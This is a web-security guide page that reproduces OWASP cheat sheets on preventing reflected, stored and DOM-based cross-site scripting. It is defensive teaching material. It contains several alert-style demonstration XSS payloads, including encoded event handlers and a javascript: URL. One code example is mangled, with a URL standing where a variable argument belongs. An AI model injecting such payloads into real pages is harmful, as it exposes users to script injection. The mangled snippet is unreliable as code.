---
title: "Web Frontend Security"
order: 3
summary: "Attacks through the browser: XSS and filter evasion, DOM clobbering, CSP, CSRF, clickjacking, XS-Leaks, security headers, HSTS, HTML5 APIs, third-party scripts, caches, subdomains, redirects and SSRF."
category: "Security"
level: Intermediate
---

# Web Frontend Security

Attacks through the browser: XSS and filter evasion, DOM clobbering, CSP, CSRF, clickjacking, XS-Leaks, security headers, HSTS, HTML5 APIs, third-party scripts, caches, subdomains, redirects and SSRF.

## Cross Site Scripting Prevention

> **Source:** [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This cheat sheet helps developers prevent XSS vulnerabilities.

Cross-Site Scripting (XSS) is a misnomer. Originally this term was derived from early versions of the attack that were primarily focused on stealing data cross-site. Since then, the term has widened to include injection of basically any content. XSS attacks are serious and can lead to account impersonation, observing user behavior, loading external content, stealing sensitive data, and more.

**This cheatsheet contains techniques to prevent or limit the impact of XSS. Since no single technique will solve XSS, using the right combination of defensive techniques will be necessary to prevent XSS.**

### Framework Security

Fortunately, applications built with modern web frameworks have fewer XSS bugs, because these frameworks steer developers towards good security practices and help mitigate XSS by using templating, auto-escaping, and more. However, developers need to know that problems can occur if frameworks are used insecurely, such as:

- _escape hatches_ that frameworks use to directly manipulate the DOM
- React’s `dangerouslySetInnerHTML` without sanitizing the HTML
- Unvalidated URL values: [React 19 blocks `javascript:` URLs in `src` and `href`](https://react.dev/blog/2024/04/25/react-19-upgrade-guide#other-breaking-changes), but this does not replace application-specific [URL validation](#xss-prevention-rules-summary)
- Angular’s `bypassSecurityTrustAs*` functions
- Lit's `unsafeHTML` function
- Polymer's `inner-h-t-m-l` attribute and `htmlLiteral` function
- Template injection
- Out of date framework plugins or components
- and more

When you use a modern web framework, you need to know how your framework prevents XSS and where it has gaps. There will be times where you need to do something outside the protection provided by your framework, which means that Output Encoding and HTML Sanitization can be critical. OWASP will be producing framework specific cheatsheets for React, Vue, and Angular.

### XSS Defense Philosophy

In order for an XSS attack to be successful, an attacker must be able to insert and execute malicious content in a webpage. Thus, all variables in a web application needs to be protected. Ensuring that **all variables** go through validation and are then escaped or sanitized is known as **perfect injection resistance**. Any variable that does not go through this process is a potential weakness. Frameworks make it easy to ensure variables are correctly validated and escaped or sanitized.

However, no framework is perfect and security gaps still exist in popular frameworks like React and Angular. Output encoding and HTML sanitization help address those gaps.

### Output Encoding

When you need to safely display data exactly as a user types it in, output encoding is recommended. Variables should not be interpreted as code instead of text. This section covers each form of output encoding, where to use it, and when you should not use dynamic variables at all.

First, when you wish to display data as the user typed it in, start with your framework’s default output encoding protection. Automatic encoding and escaping functions are built into most frameworks.

If you’re not using a framework or need to cover gaps in the framework then you should use an output encoding library. Each variable used in the user interface should be passed through an output encoding function. A list of output encoding libraries is included in the appendix.

There are many different output encoding methods because browsers parse HTML, JS, URLs, and CSS differently. Using the wrong encoding method may introduce weaknesses or harm the functionality of your application.

#### Output Encoding for “HTML Contexts”

“HTML Context” refers to inserting a variable between two basic HTML tags like a `<div>` or `<b>`. For example:

```HTML
<div> $varUnsafe </div>
```

An attacker could modify data that is rendered as `$varUnsafe`. This could lead to an attack being added to a webpage. For example:

```HTML
<div> <script>alert`1`</script> </div> // Example Attack
```

In order to add a variable to a HTML context safely to a web template, use HTML entity encoding for that variable.

Here are some examples of encoded values for specific characters:

When displaying text with JavaScript, assign it to the [`textContent` property](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent) of an ordinary element such as a `<div>`. This creates a text node without parsing HTML; it does not HTML-encode the value. Pass the original text without pre-encoding it. Do not use it for untrusted script or style content; [`HTMLScriptElement.textContent`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement/textContent) sets executable code.

```HTML
&    &amp;
<    &lt;
>    &gt;
"    &quot;
'    &#x27;
```

#### Output Encoding for “HTML Attribute Contexts”

Use HTML attribute encoding for data inserted into ordinary text attributes, such as `title` or `value`. Keep element and attribute names fixed. Attributes containing URLs, CSS, HTML, or JavaScript need controls for those additional contexts.

The placeholder below represents data already encoded for a quoted HTML attribute:

```html
<input value="ENCODED DATA">
```

**Always surround attribute values with double (`"`) or single (`'`) quotation marks.** Use your framework's or library's attribute encoder to protect the surrounding quotes and other HTML syntax. Spaces do not end a quoted value, so encoding every space or every non-alphanumeric character is unnecessary. The [HTML parsing rules](https://html.spec.whatwg.org/multipage/parsing.html#attribute-value-(double-quoted)-state) distinguish quoted values from unquoted ones, where whitespace ends the value.

HTML attribute encoding alone does not protect JavaScript in an event-handler attribute: the HTML parser decodes character references before the JavaScript is interpreted. Encoding more characters as HTML entities does not remove that second context. Prefer `addEventListener()` with trusted handler functions and pass user values as data. For unavoidable legacy templates, follow the library's [documented JavaScript-in-HTML context](https://github.com/OWASP/owasp-java-encoder/blob/main/docs/contexts.md#encode-for-the-parser-that-receives-the-value) for data inside a quoted JavaScript string within a quoted HTML attribute; an encoder cannot make untrusted handler code safe.

When updating an existing element from JavaScript, `element.setAttribute("title", value)` assigns the value directly; it does not HTML-encode it. Do not pre-encode a runtime value for this ordinary text attribute. Keep the attribute name fixed and safe: [event-handler attributes and `srcdoc` can interpret their values as code or HTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute#security_considerations).

#### Output Encoding for “JavaScript Contexts”

When a server template inserts string data into an inline script, use an encoder documented for both the JavaScript string and the enclosing HTML script. The placeholder below represents data already encoded for that location; the template supplies the quotes:

```html
<script>const message = "ENCODED DATA";</script>
```

Do not insert untrusted code, identifiers, or expressions. Use a maintained encoder and follow its context contract instead of escaping quotes manually or applying a generic `\xHH` rule. The [OWASP Java Encoder context guide](https://github.com/OWASP/owasp-java-encoder/blob/main/docs/contexts.md#encode-for-the-parser-that-receives-the-value) distinguishes script blocks, quoted event-handler strings, and standalone JavaScript. Support for ordinary template literals depends on the library and version; it does not imply support for tagged templates or `${...}` expression bodies.

These encoders protect string placement, not subsequent use: passing the resulting value to `eval()` or another code-interpreting sink remains unsafe.

For JSON, verify that the `Content-Type` header is `application/json` and not `text/html` to prevent XSS.

#### Output Encoding for “CSS Contexts”

“CSS Contexts” refer to variables placed into inline CSS, which is common when developers want their users to customize the look and feel of their webpages. Since CSS is surprisingly powerful, it has been used for many types of attacks. **Variables should only be placed in a CSS property value. Other “CSS Contexts” are unsafe and you should not place variable data in them.**

```HTML
<style> selector { property : $varUnsafe; } </style>
<style> selector { property : "$varUnsafe"; } </style>
<span style="property : $varUnsafe">Oh no</span>
```

When changing styles with JavaScript, use a fixed property such as `element.style.color` with a value from an application-defined allowlist. [CSS property assignment](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleDeclaration/setProperty) sets a CSS value; it does not automatically CSS-encode it. Do not let untrusted input choose the property or supply an entire declaration block. Properties that accept URLs require URL validation as well.

#### Output Encoding for “URL Contexts”

“URL Contexts” refer to variables placed into a URL. Most commonly, a developer will add a parameter or URL fragment to a URL base that is then displayed or used in some operation. Use URL Encoding for these scenarios.

```HTML
<a href="http://www.owasp.org?test=$varUnsafe">link</a >
```

Encode all characters with the `%HH` encoding format. Make sure any attributes are fully quoted, same as JS and CSS.

##### Common Mistake

There will be situations where you use a URL in different contexts. The most common one would be adding it to an `href` or `src` attribute of an `<a>` tag. In these scenarios, you should do URL encoding, followed by HTML attribute encoding.

```HTML
url = "https://site.com?data=" + urlencode(parameter)
<a href='attributeEncode(url)'>link</a>
```

When using JavaScript to construct a URL, use [`encodeURIComponent()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) to encode each untrusted query parameter value. It encodes a URL component; it does not validate a complete URL.

[Base64url](https://www.rfc-editor.org/rfc/rfc4648.html#section-5) represents bytes using a URL-safe alphabet. Protocols such as [JSON Web Tokens (JWTs)](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html) use an [unpadded form](https://www.rfc-editor.org/rfc/rfc7515.html#section-2) that `encodeURIComponent()` leaves unchanged. Use base64url only when the receiver expects it. After decoding, apply the output encoding or sanitization required by the destination context.

#### Dangerous Contexts

Output encoding is not perfect. It will not always prevent XSS. These locations are known as **dangerous contexts**. Dangerous contexts include:

```HTML
<script>Directly in a script</script>
<!-- Inside an HTML comment -->
<style>Directly in CSS</style>
<div ToDefineAnAttribute=test />
<ToDefineATag href="/test" />
```

Other areas to be careful with include:

- Callback functions
- Where URLs are handled in code such as this CSS { background-url : “javascript:alert(xss)”; }
- Untrusted JavaScript event-handler code (for example, an entire `onclick` value). Prefer trusted functions registered with `addEventListener()`; see the HTML Attribute Contexts section for legacy string interpolation.
- Unsafe JS functions like `eval()`, `setInterval()`, `setTimeout()`

Don't place variables into dangerous contexts as even with output encoding, it will not prevent an XSS attack fully.

### HTML Sanitization

When users need to author HTML, developers may let users change the styling or structure of content inside a WYSIWYG editor. Output encoding in this case will prevent XSS, but it will break the intended functionality of the application. The styling will not be rendered. In these cases, HTML Sanitization should be used.

HTML Sanitization will strip dangerous HTML from a variable and return a safe string of HTML. OWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) for HTML Sanitization.

```js
let clean = DOMPurify.sanitize(dirty);
```

There are some further things to consider:

- If you sanitize content and then modify it afterwards, you can easily void your security efforts.
- If you sanitize content and then send it to a library for use, check that it doesn’t mutate that string somehow. Otherwise, again, your security efforts are void.
- You must regularly patch DOMPurify or other HTML Sanitization libraries that you use. Browsers change functionality and bypasses are being discovered regularly.

### Safe Sinks

Security professionals often talk in terms of sources and sinks. If you pollute a river, it'll flow downstream somewhere. It’s the same with computer security. XSS sinks are places where variables are placed into your webpage.

Thankfully, many sinks where variables can be placed are safe. This is because these sinks treat the variable as text and will never execute it. Try to refactor your code to remove references to unsafe sinks like innerHTML, and instead use textContent or value.

```js
elem.textContent = dangerVariable;
elem.insertAdjacentText("beforeend", dangerVariable);
elem.className = dangerVariable;
elem.setAttribute(safeName, dangerVariable);
formfield.value = dangerVariable;
document.createTextNode(dangerVariable);
document.createElement(dangerVariable);
elem.innerHTML = DOMPurify.sanitize(dangerVar);
```

[`insertAdjacentText()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentText) requires a position and a text value. In the example, `"beforeend"` appends a text node inside the element. Use text sinks on ordinary elements, not script or style elements.

**Safe HTML Attributes include:** `align`, `alink`, `alt`, `bgcolor`, `border`, `cellpadding`, `cellspacing`, `class`, `color`, `cols`, `colspan`, `coords`, `dir`, `face`, `height`, `hspace`, `ismap`, `lang`, `marginheight`, `marginwidth`, `multiple`, `nohref`, `noresize`, `noshade`, `nowrap`, `ref`, `rel`, `rev`, `rows`, `rowspan`, `scrolling`, `shape`, `span`, `summary`, `tabindex`, `title`, `usemap`, `valign`, `value`, `vlink`, `vspace`, `width`.

For attributes not reported above, ensure that if JavaScript code is provided as a value, it cannot be executed.

### Other Controls

Framework Security Protections, Output Encoding, and HTML Sanitization will provide the best protection for your application. OWASP recommends these in all circumstances.

Consider adopting the following controls in addition to the above.

- Cookie Attributes - These change how JavaScript and browsers can interact with cookies. Cookie attributes try to limit the impact of an XSS attack but don’t prevent the execution of malicious content or address the root cause of the vulnerability.
- Content Security Policy - An allowlist that prevents content being loaded. It’s easy to make mistakes with the implementation so it should not be your primary defense mechanism. Use a CSP as an additional layer of defense and have a look at the [cheatsheet here](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html).
- Trusted Types - On Chromium-based browsers, enable [Trusted Types](https://web.dev/articles/trusted-types) by adding `Content-Security-Policy: require-trusted-types-for 'script'`. This causes DOM XSS sinks (`innerHTML`, `outerHTML`, `document.write`, `script.src`, etc.) to reject plain strings, forcing all assignments to go through a vetted policy. It is one of the few controls that eliminates entire classes of DOM XSS rather than mitigating them. Combine with a default policy that delegates to a sanitizer (e.g. DOMPurify) for legacy code paths.
- Web Application Firewalls - These look for known attack strings and block them. WAF’s are unreliable and new bypass techniques are being discovered regularly. WAFs also don’t address the root cause of an XSS vulnerability. In addition, WAFs also miss a class of XSS vulnerabilities that operate exclusively client-side. WAFs are not recommended for preventing XSS, especially DOM-Based XSS.

#### XSS Prevention Rules Summary

These snippets of HTML demonstrate how to render untrusted data safely in a variety of different contexts.

Data Type: String
Context: HTML Body
Code: `<span>UNTRUSTED DATA </span>`
Sample Defense: HTML Entity Encoding (rule \#1)

Data Type: String
Context: Safe HTML Attributes
Code: `<input type="text" name="fname" value="UNTRUSTED DATA ">`
Sample Defense: Quote the value and use HTML attribute encoding. Keep attribute names fixed and use ordinary text attributes; apply additional controls for URL, CSS, HTML, or JavaScript values.

Data Type: String
Context: GET Parameter
Code: `<a href="/site/search?value=UNTRUSTED DATA ">clickme</a>`
Sample Defense: URL Encoding (rule \#5).

Data Type: String
Context: Untrusted URL in a SRC or HREF attribute
Code: `<a href="UNTRUSTED URL ">clickme</a> <iframe src="UNTRUSTED URL " />`
Sample Defense: Canonicalize input, URL Validation, Safe URL verification, Allow-list http and HTTPS URLs only (Avoid the JavaScript Protocol to Open a new Window), Attribute encoder.

Data Type: String
Context: CSS Value
Code: `HTML <div style="width: UNTRUSTED DATA ;">Selection</div>`
Sample Defense: Strict structural validation (rule \#4), CSS hex encoding, Good design of CSS features.

Data Type: String
Context: JavaScript Variable
Code: `<script>var currentValue='UNTRUSTED DATA ';</script> <script>someFunction('UNTRUSTED DATA ');</script>`
Sample Defense: Insert string data only inside a quoted string, using an encoder that also protects the enclosing HTML script context. Do not rely on quote escaping alone.

Data Type: HTML
Context: HTML Body
Code: `<div>UNTRUSTED HTML</div>`
Sample Defense: HTML validation (JSoup, AntiSamy, HTML Sanitizer...).

Data Type: String
Context: DOM XSS
Code: `<script>document.write("UNTRUSTED INPUT: " + document.location.hash );<script/>`
Sample Defense: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) |

#### Output Encoding Rules Summary

The purpose of output encoding (as it relates to Cross Site Scripting) is to convert untrusted input into a safe form where the input is displayed as **data** to the user without executing as **code** in the browser. The following charts provides a list of critical output encoding methods needed to stop Cross Site Scripting.

Encoding Type: HTML Entity
Encoding Mechanism: Convert `&` to `&amp;`, Convert `<` to `&lt;`, Convert `>` to `&gt;`, Convert `"` to `&quot;`, Convert `'` to `&#x27`

Encoding Type: HTML Attribute Encoding
Encoding Mechanism: Use a framework or library encoder for quoted HTML text attributes and surround the value with `"` or `'`. Encoding every space or non-alphanumeric character is unnecessary. This does not validate URLs or encode JavaScript, CSS, or HTML contained in an attribute.

Encoding Type: URL Encoding
Encoding Mechanism: Use standard percent encoding, as specified in the [W3C specification](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1), to encode parameter values. Be cautious and only encode parameter values, not the entire URL or path fragments of a URL.

Encoding Type: JavaScript Encoding
Encoding Mechanism: Use a library encoder for JavaScript string data in the actual surrounding context. It must protect the string delimiters and, when embedded in HTML, the enclosing script or attribute. Follow the library's supported contexts; hex or Unicode escapes alone are not a substitute for that contract.

Encoding Type: CSS Hex Encoding
Encoding Mechanism: CSS encoding supports both `\XX` and `\XXXXXX` formats. To ensure proper encoding, consider these options: (a) Add a space after the CSS encode (which will be ignored by the CSS parser), or (b) use the full six-character CSS encoding format by zero-padding the value. For example, `A` becomes `\41` (short format) or `\000041` (full format). Alphanumeric characters (letters A to Z, a to z, and digits 0 to 9) remain unencoded.

### Common Anti-patterns: Ineffective Approaches to Avoid

Defending against XSS is hard. For that reason, some have sought shortcuts to preventing XSS.

We're going to examine two common [anti-patterns](https://en.wikipedia.org/wiki/Anti-pattern) that frequently show up in ancient posts, but are still commonly cited as solutions in modern posts about XSS defense on programmer forums such as Stack Overflow and other developer hangouts.

#### Sole Reliance on Content-Security-Policy (CSP) Headers

First, let us be clear, we are a strong proponent of CSP when it is used properly. In the context of XSS defense, CSP works best when it it is:

- Used as a defense-in-depth technique.
- Customized for each individual application rather than being deployed as a one-size-fits-all enterprise solution.

What we are against is a blanket CSP policy for the entire enterprise. Problems with that approach are:

##### Problem 1 - Assumption Browser Versions Support CSP Equally

There usually is an implicit assumption that all the customer browsers support all the CSP constructs that your blanket CSP policy is using. Furthermore, this assumption often is done without testing the explicitly the `User-Agent` request header to see if it indeed is a supported browser type and rejecting the use of the site if it is not. Why? Because most businesses don't want to turn away customers if they are using an outdated browser that doesn't support some CSP Level 2 or Level 3 construct that they are relying on for XSS prevention.  (Statistically, almost all browsers support CSP Level 1 directives, so unless you are worried about Grandpa pulling out his old Windows 98 laptop and using some ancient version of Internet Explorer to access your site, CSP Level 1 support can probably be assumed.)

##### Problem 2 - Issues Supporting Legacy Applications

Mandatory universal enterprise-wide CSP response headers are inevitably going to break some web applications, especially legacy ones. This causes the business to push-back against AppSec guidelines and inevitably results in AppSec issuing waivers and/or security exceptions until the application code can be patched up. But these security exceptions allow cracks in your XSS armor, and even if the cracks are temporary they still can impact your business, at least on a reputational basis.

#### Reliance on HTTP Interceptors

The other common anti-pattern that we have observed is the attempt to deal with validation and/or output encoding in some sort of interceptor such as a Spring Interceptor that generally implements `org.springframework.web.servlet.HandlerInterceptor` or as a JavaEE servlet filter that implements `javax.servlet.Filter`. While this can be successful for very specific applications (for instance, if you validate that all the input requests that are ever rendered are only alphanumeric data), it violates the major tenet of XSS defense where perform output encoding as close to where the data is rendered is possible. Generally, the HTTP request is examined for query and POST parameters but other things HTTP request headers that might be rendered such as cookie data, are not examined. The common approach that we've seen is someone will call either `ESAPI.validator().getValidSafeHTML()` or `ESAPI.encoder.canonicalize()` and depending on the results will redirect to an error page or call something like `ESAPI.encoder().encodeForHTML()`. Aside from the fact that this approach often misses tainted input such as request headers or "extra path information" in a URI, the approach completely ignores the fact that the output encoding is completely non-contextual. For example, how does a servlet filter know that an input query parameter is going to be rendered in an HTML context (i.e., between HTML tags) rather than in a JavaScript context such as within a `<script>` tag or used with a JavaScript event handler attribute? It doesn't. And because JavaScript and HTML encoding are not interchangeable, you leave yourself still open to XSS attacks.

Unless your filter or interceptor has full knowledge of your application and specifically an awareness of how your application uses each parameter for a given request, it can't succeed for all the possible edge cases. And we would contend that it never will be able to using this approach because providing that additional required context is way too complex of a design and accidentally introducing some other vulnerability (possibly one whose impact is far worse than XSS) is almost inevitable if you attempt it.

This naive approach usually has at least one of these four problems.

##### Problem 1 - Encoding for specific context not satisfactory for all URI paths

One problem is the improper encoding that can still allow exploitable XSS in some URI paths of your application. An example might be a 'lastname' form parameter from a POST that normally is displayed between HTML tags so that HTML encoding is sufficient, but there may be an edge case or two where lastname is actually rendered as part of a JavaScript block where the HTML encoding is not sufficient and thus it is vulnerable to XSS attacks.

##### Problem 2 - Interceptor approach can lead to broken rendering caused by improper or double encoding

A second problem with this approach can be the application can result in incorrect or double encoding. E.g., suppose in the previous example, a developer has done proper output encoding for the JavaScript rendering of lastname. But if it is already been HTML output encoded too, when it is rendered, a legitimate last name like "O'Hara" might come out rendered like "O\&#39;Hara".

While this second case is not strictly a security problem, if it happens often enough, it can result in business push-back against the use of the filter and thus the business may decide on disabling the filter or a way to specify exceptions for certain pages or parameters being filtered, which in turn will weaken any XSS defense that it was providing.

##### Problem 3 - Interceptors not effective against DOM-based XSS

The third problem with this is that it is not effective against DOM-based XSS. To do that, one would have to have an interceptor or filter scan all the JavaScript content going as part of an HTTP response, try to figure out the tainted output and see if it it is susceptible to DOM-based XSS. That simply is not practical.

##### Problem 4 - Interceptors not effective where data from responses originates outside your application

The last problem with interceptors is that they generally are oblivious to data in your application's responses that originate from other internal sources such as an internal REST-based web service or even an internal database. The problem is that unless your application is strictly validating that data _at the point that it is retrieved_ (which generally is the only point your application has enough context to do a strict data validation using an allow-list approach), that data should always be considered tainted. But if you are attempting to do output encoding or strict data validation all of tainted data on the HTTP response side of an interceptor (such as a Java servlet filter), at that point, your application's interceptor will have no idea of there is tainted data present from those REST web services or other databases that you used. The approach that generally is used on response-side interceptors attempting to provide XSS defense has been to only consider the matching "input parameters" as tainted and do output encoding or HTML sanitization on them and everything else is considered safe. But sometimes it's not? While it frequently is assumed that all internal web services and all internal databases can be "trusted" and used as it, this is a very bad assumption to make unless you have included that in some deep threat modeling for your application.

For example, suppose you are working on an application to show a customer their detailed monthly bill. Let's assume that your application is either querying a foreign (as in not part of your specific application) internal database or REST web service that your application uses to obtain the user's full name, address, etc. But that data originates from another application which you are assuming is "trusted" but actually has an unreported persistent XSS vulnerability on the various customer address-related fields. Furthermore, let's assume that you company's customer support staff can examine a customer's detailed bill to assist them when customers have questions about their bills. So nefarious customer decides to plant an XSS bomb in the address field and then calls customer service for assistance with the bill. Should a scenario like that ever play out, an interceptor attempting to prevent XSS is going to miss that completely and the result is going to be something much worse than just popping an alert box to display "1" or "XSS" or "pwn'd".

#### Summary

One final note: If deploying interceptors / filters as an XSS defense was a useful approach against XSS attacks, don't you think that it would be incorporated into all commercial Web Application Firewalls (WAFs) and be an approach that OWASP recommends in this cheat sheet?

### Related Articles

See the [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) for examples that illustrate why filtering alone is insufficient.

## DOM based XSS Prevention

> **Source:** [DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Commonly discussed, overlapping categories of [XSS (Cross-Site Scripting)](https://owasp.org/www-community/attacks/xss/) include:

- [Reflected or Stored](https://owasp.org/www-community/attacks/xss/#stored-and-reflected-xss-attacks)
- [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).

The [XSS Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) does an excellent job of addressing Reflected and Stored XSS. This cheatsheet addresses DOM (Document Object Model) based XSS and is an extension (and assumes comprehension) of the [XSS Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Stored and reflected describe how an attack payload reaches a victim; server-side and client-side describe where untrusted data is handled unsafely. [Both stored and reflected XSS can occur on the client or server](https://community.owasp.org/Types_of_Cross-Site_Scripting#types-of-cross-site-scripting), including stored and reflected DOM-based XSS.

For server-side XSS, the server inserts untrusted data into a response without making it safe for its output context. DOM-based XSS arises from unsafe client-side processing. In either case, the injected script executes in the browser; choose controls for the actual data flow and output context.

When a browser is rendering HTML and any other associated content like CSS or JavaScript, it identifies various rendering contexts for the different kinds of input and follows different rules for each context. A rendering context is associated with the parsing of HTML tags and their attributes.

- The HTML parser of the rendering context dictates how data is presented and laid out on the page and can be further broken down into the standard contexts of HTML, HTML attribute, URL, and CSS.
- The JavaScript or VBScript parser of an execution context is associated with the parsing and execution of script code. Each parser has distinct and separate semantics in the way they can possibly execute script code which make creating consistent rules for mitigating vulnerabilities in various contexts difficult. The complication is compounded by the differing meanings and treatment of encoded values within each subcontext (HTML, HTML attribute, URL, and CSS) within the execution context.

For the purposes of this article, we refer to the HTML, HTML attribute, URL, and CSS contexts as subcontexts because each of these contexts can be reached and set within a JavaScript execution context.

In JavaScript code, the main context is JavaScript but with the right tags and context closing characters, an attacker can try to attack the other 4 contexts using equivalent JavaScript DOM methods.

The following is an example vulnerability which occurs in the JavaScript context and HTML subcontext:

```html
 <script>
 var x = '<%= taintedVar %>';
 var d = document.createElement('div');
 d.innerHTML = x;
 document.body.appendChild(d);
 </script>
```

Let's look at the individual subcontexts of the execution context in turn.

### RULE \#1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context

There are several methods and attributes which can be used to directly render HTML content within JavaScript. These methods constitute the HTML Subcontext within the Execution Context. If these methods are provided with untrusted input, then an XSS vulnerability could result. For example:

#### Example Dangerous HTML Methods

##### Attributes

```javascript
 element.innerHTML = "<HTML> Tags and markup";
 element.outerHTML = "<HTML> Tags and markup";
```

##### Methods

```javascript
 document.write("<HTML> Tags and markup");
 document.writeln("<HTML> Tags and markup");
```

#### Guideline

To make dynamic updates to HTML in the DOM safe, we recommend:

 1. HTML encoding, and then
 2. JavaScript encoding all untrusted input, as shown in these examples:

```javascript
 var ESAPI = require('node-esapi');
 element.innerHTML = "<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>";
 element.outerHTML = "<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>";
```

```javascript
 var ESAPI = require('node-esapi');
 document.write("<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>");
 document.writeln("<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>");
```

### RULE \#2 - JavaScript Escape Before Inserting Untrusted Data into HTML Attribute Subcontext within the Execution Context

The HTML attribute *subcontext* within the *execution* context is divergent from the standard encoding rules. This is because the rule to HTML attribute encode in an HTML attribute rendering context is necessary in order to mitigate attacks which try to exit out of an HTML attributes or try to add additional attributes which could lead to XSS.

When you are in a DOM execution context you only need to JavaScript encode HTML attributes which do not execute code (attributes other than event handler, CSS, and URL attributes).

For example, the general rule is to HTML Attribute encode untrusted data (data from the database, HTTP request, user, back-end system, etc.) placed in an HTML Attribute. This is the appropriate step to take when outputting data in a rendering context, however using HTML Attribute encoding in an execution context will break the application display of data.

#### SAFE but BROKEN example

```javascript
 var ESAPI = require('node-esapi');
 var x = document.createElement("input");
 x.setAttribute("name", "company_name");
 // In the following line of code, companyName represents untrusted user input
 // The ESAPI.encoder().encodeForHTMLAttribute() is unnecessary and causes double-encoding
 x.setAttribute("value", '<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTMLAttribute(companyName))%>');
 var form1 = document.forms[0];
 form1.appendChild(x);
```

The problem is that if companyName had the value "Johnson & Johnson". What would be displayed in the input text field would be "Johnson &#x26;amp; Johnson". The appropriate encoding to use in the above case would be only JavaScript encoding to disallow an attacker from closing out the single quotes and in-lining code, or escaping to HTML and opening a new script tag.

#### SAFE and FUNCTIONALLY CORRECT example

```javascript
 var ESAPI = require('node-esapi');
 var x = document.createElement("input");
 x.setAttribute("name", "company_name");
 x.setAttribute("value", '<%=ESAPI.encoder().encodeForJavascript(companyName)%>');
 var form1 = document.forms[0];
 form1.appendChild(x);
```

It is important to note that when setting an HTML attribute which does not execute code, the value is set directly within the object attribute of the HTML element so there is no concerns with injecting up.

### RULE \#3 - Be Careful when Inserting Untrusted Data into the Event Handler and JavaScript code Subcontexts within an Execution Context

Putting dynamic data within JavaScript code is especially dangerous because JavaScript encoding has different semantics for JavaScript encoded data when compared to other encodings. In many cases, JavaScript encoding does not stop attacks within an execution context. For example, a JavaScript encoded string will execute even though it is JavaScript encoded.

Therefore, the primary recommendation is to **avoid including untrusted data in this context**. If you must, the following examples describe some approaches that do and do not work.

```javascript
var x = document.createElement("a");
x.href="#";
// In the line of code below, the encoded data on the right (the second argument to setAttribute)
// is an example of untrusted data that was properly JavaScript encoded but still executes.
x.setAttribute("onclick", "\u0061\u006c\u0065\u0072\u0074\u0028\u0032\u0032\u0029");
var y = document.createTextNode("Click To Test");
x.appendChild(y);
document.body.appendChild(x);
```

The `setAttribute(name_string,value_string)` method is dangerous because it implicitly coerces the *value_string* into the DOM attribute datatype of *name_string*.

In the case above, the attribute name is an JavaScript event handler, so the attribute value is implicitly converted to JavaScript code and evaluated. In the case above, JavaScript encoding does not mitigate against DOM based XSS.

Other JavaScript methods that interpret strings as code, such as `setTimeout`, `setInterval`, and `Function`, have the same risk. HTML event-handler attributes also contain [JavaScript function bodies](https://html.spec.whatwg.org/multipage/webappapis.html#event-handler-content-attributes). Escaping every character in one payload may produce a syntax error, but JavaScript encoding is not a defense for this context: escaped identifiers remain executable when the surrounding syntax is valid.

```html
<!-- Executes alert(1) when clicked; encoding the identifier does not make it safe. -->
<a id="bb" href="#" onclick="\u0061\u006c\u0065\u0072\u0074(1)">Test Me</a>
```

Setting the JavaScript `onclick` property is different from setting an HTML attribute. It expects a callback; assigning a primitive string [sets it to null](https://webidl.spec.whatwg.org/#LegacyTreatNonObjectAsNull), whether or not the string is encoded. This is type conversion, not a benefit of JavaScript encoding. Assign a trusted function, and keep untrusted values as data inside that function rather than compiling them as code.

```html
<a id="bb" href="#">Test Me</a>
```

```javascript
// Neither string becomes a handler.
document.getElementById("bb").onclick = "alert(7)";
document.getElementById("bb").onclick = "\u0061\u006c\u0065\u0072\u0074\u0028\u0037\u0029";

// A trusted function is a handler.
document.getElementById("bb").onclick = function () {
    alert("I was called.");
};
```

There are other places in JavaScript where JavaScript encoding is accepted as valid executable code.

```javascript
 for(var \u0062=0; \u0062 < 10; \u0062++){
     \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
     .\u0077\u0072\u0069\u0074\u0065\u006c\u006e
     ("\u0048\u0065\u006c\u006c\u006f\u0020\u0057\u006f\u0072\u006c\u0064");
 }
 \u0077\u0069\u006e\u0064\u006f\u0077
 .\u0065\u0076\u0061\u006c
 \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
 .\u0077\u0072\u0069\u0074\u0065(111111111);
```

or

```javascript
 var s = "\u0065\u0076\u0061\u006c";
 var t = "\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029";
 window[s](https://cheatsheetseries.owasp.org/cheatsheets/t);
```

Because JavaScript is based on an international standard (ECMAScript), JavaScript encoding enables the support of international characters in programming constructs and variables in addition to alternate string representations (string escapes).

